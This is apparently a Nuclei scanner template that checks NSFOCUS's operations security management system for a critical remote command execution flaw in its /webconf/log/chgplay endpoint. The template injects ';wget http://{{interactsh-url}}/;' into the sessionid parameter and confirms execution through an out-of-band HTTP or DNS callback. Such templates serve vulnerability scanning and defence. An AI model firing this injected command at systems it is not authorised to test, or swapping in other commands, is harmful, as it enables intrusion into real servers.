id: nsfocus-chgplay-rce

info:
  name: 绿盟运维安全管理系统 chgplay 远程命令执行漏洞
  author: nsfocus
  severity: critical
  tags: nsfocus


http:
  - raw:
      - |+
        @timeout: 30s
        GET /webconf/log/chgplay?cat=espc&sid=7473a85e535405e7bd991cb82b2f134c&status=charset&speed=10&sessionid=;wget%20http%3a//{{interactsh-url}}/; HTTP/1.1
        Host: {{Hostname}}
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
        Accept-Encoding: gzip, deflate
        Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
        Connection: keep-alive
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36


    max-redirects: 3
    matchers:
      - type: dsl
        dsl:
          - "contains(interactsh_protocol, 'http') || contains(interactsh_protocol, 'dns')"
          - "status_code == 200 || status_code == 400 || status_code == 500"
          - 'len(body) < 10'
        condition: and